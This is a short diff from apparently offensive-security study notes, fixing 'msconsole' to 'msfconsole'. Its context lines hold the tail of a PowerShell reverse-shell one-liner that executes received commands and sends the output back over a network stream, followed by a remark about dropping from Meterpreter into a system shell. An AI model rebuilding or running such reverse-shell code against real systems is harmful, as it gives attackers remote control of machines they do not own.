@@ -10,7 +10,7 @@ $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd
 $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 
-msconsole:
+msfconsole:
   We will notice limitations with the Meterpreter shell,
   so it is good to attempt to use the shell command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.
 
